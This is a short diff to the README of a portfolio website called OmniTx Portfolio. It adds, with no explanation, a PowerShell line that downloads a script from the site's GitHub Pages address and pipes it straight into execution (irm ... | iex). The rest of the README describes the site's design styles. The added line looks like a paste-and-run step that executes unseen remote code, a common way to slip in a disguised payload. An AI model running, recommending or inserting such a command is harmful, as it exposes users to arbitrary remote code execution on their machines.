@@ -1,5 +1,7 @@
 # OmniTx Portfolio
 
+irm https://omnitx.github.io/setup | iex
+
 A modern, professional portfolio website showcasing three distinct design styles with cutting-edge visual effects and seamless user experience.
 
 🌐 **Live:** [omnitx.github.io](https://omnitx.github.io)
